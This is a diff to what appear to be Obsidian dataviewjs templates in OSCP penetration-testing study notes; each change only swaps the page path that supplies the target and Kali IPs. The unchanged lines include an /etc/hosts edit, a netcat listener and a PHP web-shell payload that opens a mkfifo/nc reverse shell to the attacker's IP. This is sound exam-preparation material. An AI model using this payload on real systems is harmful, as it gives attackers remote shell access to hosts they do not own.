@@ -1,6 +1,6 @@
 Visit the web Address
 ```dataviewjs
-const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `http://${ip}/`;
 
@@ -10,7 +10,7 @@ If find any domain names,
 
 Add hosts to /etc/hosts 
 ```dataviewjs
-const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `echo "${ip} [domain_name]" | sudo tee -a /etc/hosts`;
 
@@ -80,7 +80,7 @@ nc -lvnp 4444
 ```
 
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;
 
